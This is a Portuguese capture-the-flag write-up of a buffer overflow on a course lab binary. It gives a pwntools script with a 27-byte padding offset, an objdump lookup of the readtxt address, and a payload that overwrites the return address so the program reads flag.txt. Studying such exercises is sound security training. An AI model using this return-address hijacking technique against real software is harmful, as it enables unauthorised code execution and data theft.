# Buffer Overflow

O código fornecido explora a vulnerabilidade manipulando o fluxo de execução do programa, redirecionando-o para abrir e ler o arquivo flag.txt.

## Etapas da Exploração

Estabelecimento da Conexão: O código configura uma conexão com o binário, localmente ou remotamente:

    r = remote('ctf-fsi.fe.up.pt', 4000)  # Para servidor remoto

### Identificação do Offset:

 O offset do buffer overflow foi identificado como 27 bytes.


### Localização da Função readtxt:

O endereço da função readtxt foi identificado como 0x080497a5. Esse endereço foi encontrado utilizando ferramentas objdump:

    objdump -d program | grep readtxt

![image](/screenshots/CTF5_2.png)

### Construção do Payload:

O payload é composto por:
- O argumento da função (flag) armazenado no início do buffer.
- Padding para preencher até o offset (27 bytes).
- O endereço da função readtxt sobrescrevendo o endereço de retorno.
- O argumento (flag) repetido, necessário para ser lido corretamente pela função.

O payload final é construído no código da seguinte forma:

    offset = 27  # Offset do buffer overflow
    padding = b"A" * offset
    readtxt_address = 0x080497a5  # Endereço da função readtxt
    argument = b"flag\0"

    payload = b"flag\0" + padding
    payload += p32(readtxt_address)
    payload += b"flag"

### Execução do Ataque:

O payload é enviado após a mensagem inicial do programa:

    r.recvuntil(b"flag:\n")  # Aguarda o prompt do programa
    r.sendline(payload)      # Envia o payload

O programa é explorado para abrir e ler o conteúdo de flag.txt, retornando o resultado ao atacante:

    buf = r.recv().decode()  # Recebe e decodifica a flag
    print(buf)

![image](/screenshots/CTF5_2.png)